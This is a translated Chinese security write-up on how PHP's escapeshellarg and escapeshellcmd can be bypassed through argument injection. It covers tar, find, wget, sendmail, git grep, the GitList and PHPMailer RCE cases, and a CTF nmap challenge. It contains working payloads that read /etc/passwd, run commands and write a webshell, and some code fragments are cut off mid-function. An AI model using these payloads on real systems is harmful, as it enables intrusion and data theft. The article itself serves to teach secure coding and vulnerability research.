# PHP-escapeshell-命令执行
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 最近审计PHP时，频繁出现的escapeshellarg与escapeshellcmd成功勾起了我的 ~~性致~~ 兴趣，深入了解后发现确实漏洞百出
>
> Know it then do it
## escapeshellarg
> string escapeshellarg ( string $arg )
转义字符串`$arg`中的单引号并使用单引号包裹此部分
使得`$arg`只能传递一个参数，且不能执行不同的命令
## escapeshellcmd
> string escapeshellcmd ( string $command )
转义`& # ; ` | * ? ~  ^ ( ) [ ] { } $ `、`x0A`和`xF`，`'`和`"`仅在落单时被转义
使得`$command`只能执行一个命令，但可以传递多个参数
## 举个栗子
  * $arg->`172.17.0.2' -v -d a=1`
  * ->escapeshellarg->`'172.17.0.2''' -v -d a=1'`
  * ->escapeshellcmd->`'172.17.0.2'\'' -v -d a=1'`
  * ->`172.17.0.2 -v -d a=1'`
## 历史漏洞
  * Windows下PHP 如果向`escapeshellarg`或`escapeshellarg`传递1024兆个字节，则可能会触发堆溢出
  * Windows下5.4.43以下的5.4.x, 5.5.27以下的5.5.x, 5.6.11以下的5.6.x-[Bugs](https://bugs.php.net/bug.php?id=69768)
    //EnableDelayedExpansion`为`enabled`时，`!STH!`的特性类似于`%STH%`，而`escapeshellarg`并未处理`!`
    //可以在HKLM或HKCU下的注册表中设置EnableDelayedExpansion
    [HKEY_CURRENT_USERSoftwareMicrosoftCommand Processor]
    "DelayedExpansion"= (REG_DWORD)
    1=enabled 0=disabled (default)
    // Leak appdata dir value
    $text = '!APPDATA!';
    print "echo ".escapeshellarg($text);
  * PHP5.6.18以下-[Bugs](https://bugs.php.net/bug.php?id=71039)
    //`ext/standard/exec.c`中
    echo escapeshellarg("helloworld");
    =>
    hello
## 参数注入
由上文可以看出，当存在`escapeshellarg`或`escapeshellcmd`时均不可能执行第二个命令，但仍能传递多个参数给`escapeshellcmd`，漏洞可造成的危害取决于当前程序所拥有的功能
###  tar
  * 将`some_file`压缩至`/tmp/sth`
    $command = '-cf /tmp/sth /some_file';
    system(escapeshellcmd('tar '.$command));
  * 创建`/tmp/exploit`空文件
    $command = "--use-compress-program='touch /tmp/exploit' -cf /tmp/passwd /etc/passwd";
    system(escapeshellcmd('tar '.$command));
###  find
  * 在`/tmp`目录下查找`some_file`
    $file = "some_file";
    system("find /tmp -iname ".escapeshellcmd($file));
  * 输出`/etc/passwd`的内容
    $file = "sth -or -exec cat /etc/passwd ; -quit";
    system("find /tmp -iname ".escapeshellcmd($file));
###  wget
  * 下载`example.php`
    $url = 'http://example.com/example.php';
    system(escapeshellcmd('wget '.$url));
  * 保存`.php`文件至指定目录
    $url = '--directory-prefix=/var/www/html http://example.com/example.php';
    system(escapeshellcmd('wget '.$url));
###  sendmail
  * 将发件人地址设置为`[PI:EMAIL](mailto:PI:EMAIL)`并发送`mail.txt`
    $from = 'PI:EMAIL';
    system("/usr/sbin/sendmail -t -i -f".escapeshellcmd($from ).' getClient()->run($this, "grep -i --line-number {$query} $branch");
        } catch (RuntimeException $e) {
            return false;
        }
    }
上述代码可简化为：
    $query = 'sth';
    system('git grep -i --line-number '.escapeshellarg($query).' *');
由[git-grep文档](https://git-scm.com/docs/git-grep)可知，`--open-files-in-pager`类似于`find`命令的`-exec`
    $query = '--open-files-in-pager=id;';
    system('git grep -i --line-number '.escapeshellarg($query).' *');
###  修复方案
p神曾经分析过，漏洞最佳解决方案为将`$query`作为`-e`参数的值，即`git grep -i --line-number -e '--open-files-in-pager=id;' master`，不过gitlist采取了另外一种措施：
    //将`-`替换后在`$query`前加上`--`
    getClient()->run($this, "grep -i --line-number -- {$query} $branch");
        } catch (RuntimeException $e) {
            return false;
        }
## PHPMailer
PHPMailer的[源代码](https://github.com/php/php-src/blob/PHP-5.6.29/ext/standard/mail.c)中，存在参数注入导致的远程命令执行
    if (force_extra_parameters) {
        extra_cmd = php_escape_shell_cmd(force_extra_parameters);
    } else if (extra_cmd) {
        extra_cmd = php_escape_shell_cmd(extra_cmd);
    }
    if (php_mail(to_r, subject_r, message, headers_trimmed, extra_cmd TSRMLS_CC)) {
        RETVAL_TRUE;
    } else {
        RETVAL_FALSE;
    }
上述代码可简化为：
    escapeshellarg->escapeshellcmd->`的顺序配合使用时，则会存在参数注入。`a'(
-OQueueDirectory=/tmp -X/var/www/html/x.php )[@a](https://github.com/a
"@a").com`最终变成了`'-fa'\''( -OQueueDirectory=/tmp -X/var/www/html/test.php
)[@a](https://github.com/a
"@a").com'`，但若将其顺序调换则不会出现此问题，即`->escapeshellcmd->escapeshellarg->`
## Nmap命令执行
  * 一道Web安全测试南京总决赛时的CTF题
    ";
        @mkdir($sandbox);
        chdir($sandbox);
        echo "";
        echo system("nmap -T5  -sT -Pn --host-timeout 2 -F  ".$host);
        echo "";
    }
    ?>
因为输入流先进`escapeshellarg`函数，再进`escapeshellcmd`函数，所以存在参数注入。随后可利用nmap的`-oN`参数将Webshell写入沙盒文件夹。
###  逃逸单引号
Payload：`?host='  -oN shell.php '`
## 参考资料
[参考资料0](https://paper.seebug.org/164/)，[参考资料1](https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html#gitlist-rce-exploit)，[参考资料2](https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html)